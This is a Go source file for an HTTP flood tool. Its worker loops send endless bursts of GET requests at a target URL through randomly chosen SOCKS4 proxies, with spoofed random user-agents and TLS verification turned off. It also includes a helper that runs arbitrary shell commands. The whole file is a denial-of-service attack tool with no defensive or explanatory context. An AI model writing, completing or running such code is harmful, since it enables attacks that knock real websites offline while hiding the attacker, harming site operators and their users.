package main

import (
	"bufio"
	"crypto/tls"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"time"

	browser "github.com/EDDYCJY/fake-useragent"
	"github.com/gamexg/proxyclient"
)

// Returns an array of User-agent
func getUserAgents(number int) []string {
	ua := make([]string, number)

	for i := range ua {
		ua[i] = browser.Random()
	}

	return ua
}

// Returns a random element in the []string
func random(seeds []string) string {
	return seeds[rand.Intn(len(seeds))]
}

func readLines(fileName string) []string {
	var lines []string
	openFile, _ := os.Open(fileName)
	scanner := bufio.NewScanner(openFile)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}

func flood(u *url.URL, useragent, proxy string, n int) {
	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		return
	}

	req.Header.Set("Accept", "*/*")
	req.Header.Set("User-Agent", useragent)
	req.Header.Set("Connection", "keep-alive")

	dialer, err := proxyclient.NewProxyClient("socks4://" + proxy)
	if err != nil {
		return
	}

	conn, err := dialer.DialTimeout("tcp", u.Host, 5*time.Second)
	if err != nil {
		return
	}

	if u.Scheme == "https" {
		conn = tls.Client(conn, &tls.Config{
			ServerName:         u.Hostname(),
			InsecureSkipVerify: true,
		})
	}

	defer conn.Close()
	for i := 0; i < n; i++ {
		req.Write(conn)
	}
}

func worker(u *url.URL, useragents, proxies []string) {
	for {
		flood(u, random(useragents), random(proxies), 100)
	}
}

func runCommand(command string) {
	exec.Command("sh", "-c", command).Run()
}
